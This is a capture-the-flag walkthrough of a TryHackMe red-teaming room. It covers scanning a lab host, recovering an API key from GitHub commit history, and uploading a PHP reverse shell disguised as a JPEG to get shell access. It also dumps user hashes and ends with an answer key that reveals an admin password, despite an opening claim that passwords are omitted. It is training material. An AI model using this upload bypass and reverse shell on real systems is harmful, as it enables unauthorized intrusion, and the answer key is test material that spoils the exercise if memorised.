```Description 
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

Welcome to the OSINT challenge, part of TryHackMe’s Red Teaming Path. In this task, you will be an ethical hacker aiming to exploit a newly developed web application.

SuperSecure Corp, a fast-paced startup, is currently creating a blogging platform inviting security professionals to assess its security. The challenge involves using OSINT techniques to gather information from publicly accessible sources and exploit potential vulnerabilities in the web application.

Start by deploying the machine; Click on the `Start Machine` button in the upper-right-hand corner of this task to deploy the virtual machine for this room.

Your goal is to identify and exploit vulnerabilities in the application using a combination of recon and OSINT skills. As you progress, you’ll look for weak points in the app, find sensitive data, and attempt to gain unauthorized access. You will leverage the skills and knowledge acquired through the Red Team Pathway to devise and execute your attack strategies.

**Note:** Please allow the machine 3 - 5 minutes to fully boot. Also, no local privilege escalation is necessary to answer the questions.
```

IP Address

```IP_Adress
10.10.124.132
```

starting with nmap

```Bash 
nmap -A -p- 10.10.124.132
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 2.67 seconds
```

then starting Gobuster to find the hidden Directories

```Bash 
gobuster dir -u http://10.10.124.132/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,bak
/.php (Status: 403) [Size: 274] 
/.html (Status: 403) [Size: 274] 
/index.php (Status: 302) [Size: 0] [--> /public/html/] 
/public (Status: 301) [Size: 307] [--> https://grep.thm/public/] 
/api (Status: 301) [Size: 304] [--> https://grep.thm/api/] 
/javascript (Status: 301) [Size: 311] [--> https://grep.thm/javascript/] /phpmyadmin (Status: 403) [Size: 274] 
```

then we first find out about the issue on 443 port that we need to add host on website so we just add the

```bash 
sudo nano /etc/hosts
10.10.124.132   grep.thm
```
Then I surf on Browser and we get the website which shows the Register and Login panels on website and website known as `SearchMe!` 
so I tried to register on website and I got an Error which is `API_INVALID_OR_EXPIRED` then I check the Register.js Code and Find out API Key which is also an MD5sum 
```INVALID_API
e8d25b4208b80008a9e15c8698640e85          =      johncena
```
so by searching on `Github` I Discovered an Repo whose description caught my attention which is `In Progress` and I deep down the repo I find out there is 2 commits in the repo in the Register.js file 
```Github_link
https://github.com/supersecuredeveloper/searchmecms
```

```Commits
1st initial commit
2nd Remove API Key
```
then by Comparing the changes I found out the Actual API_KEY which is also MD5sum

```API_KEY
ffe60ecaa8bba2f12b43d1a4b15b8f39         =       youcantseeme
```
then using Curl Command I register myself on website 
```Curl
curl -k -X POST https://grep.thm/api/register.php \
  -H "Content-Type: application/json" \
  -H "X-Thm-Api-Key: youcantseeme" \
  -d '{"username":"admin1","password":"testpass123","email":"admin@grep.thm","name":"test"}'   
  {message: Resgistered Successfully}
```
After Registered, I Login into Website I got the First Flag 
```Flag
[flag omitted]
```
then we try to find more directories after login in into the website using `ffuf`
#FFuF_WEB_Content 

```FFuF
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://grep.thm/api/FUZZ.php -k -mc 200,401,403
.htaccess      [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 189ms]
.hta           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 207ms]
.htpasswd      [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 188ms]
config         [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 546ms]
index          [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 199ms]
login          [Status: 200, Size: 34, Words: 3, Lines: 1, Duration: 216ms]
logout         [Status: 200, Size: 42, Words: 4, Lines: 1, Duration: 208ms]
posts          [Status: 200, Size: 25, Words: 3, Lines: 1, Duration: 227ms]
register       [Status: 200, Size: 38, Words: 5, Lines: 1, Duration: 192ms]
upload         [Status: 200, Size: 39, Words: 3, Lines: 1, Duration: 187ms]
```
then we surf to `https://grep.thm/public/html/upload.php` to upload `IMG` file on the website which will reflect `https://grep.thm/api/uploads` and also upload code is present on the above github repo from where we know we need to create a `Reverse shell image` which gives us the reverse shell on our terminal we create image by  
```bash
wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php //after Downloading change IP-Address & Port number before converting
mv php-reverse-shell.php newrev.jpg.php 
hexeditor newrev.jpg.php // initial ff d8 ff e0
```
and upload on website and visit the endpoint `https://grep.thm/api/uploads/nevrev.jpg.php` and then we got reverse-shell
which we need to make stable by 
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL-Z
stty raw -echo; fg
export TERM=xterm
```
then we tried to find admin details we found backup files `/var/www/backup/user.sql`
where we got Admin Detaisl
```Admin_details
INSERT INTO `users` (`id`, `username`, `password`, `email`, `name`, `role`) VALUES
(1, 'test', '$2y$10$dE6VAdZJCN4repNAFdsO2ePDr3StRdOhUJ1O/41XVQg91qBEBQU3G', 'test@grep.thm', 'Test User', 'user'),
(2, 'admin', '$2y$10$3V62f66VxzdTzqXF4WHJI.Mpgcaj3WxwYsh7YDPyv1xIPss4qCT9C', 'admin@searchme2023cms.grep.thm', 'Admin User', 'admin');
```
`admin@searchme2023cms.grep.thm` Admin E-mail
after getting admin details we need to get the host name of the web application that allows a user to check an email for a possible password leak
which we get in previous folder `/var/www/leakchecker`
which contains two files 
```files
check_emails.php
index.php
```
then we guessed the host might be `leakchecker.grep.thm` host so we add it in our `/etc/hosts` file
```bash
sudo nano /etc/hosts
10.10.124.132   grep.thm leakchecker.grep.thm
```
and then visit to `leakchecker.grep.thm`

```
Email Leak Checker
Email: admin@searchme2023cms.grep.thm
Password: [password omitted]
```

Done!

FInal 
```Q/A
Q1. What is the API key that allows a user to register on the website?
A1. ffe60ecaa8bba2f12b43d1a4b15b8f39

Q2. What is the first flag?
A2. [flag omitted]

Q3. What is the email of the "admin" user?
A3. admin@searchme2023cms.grep.thm

Q4. What is the host name of the web application that allows a user to check an email for a possible password leak?
A4. leakchecker.grep.thm

Q5. What is the password of the "admin" user?
A5. admin_tryhackme!
```


		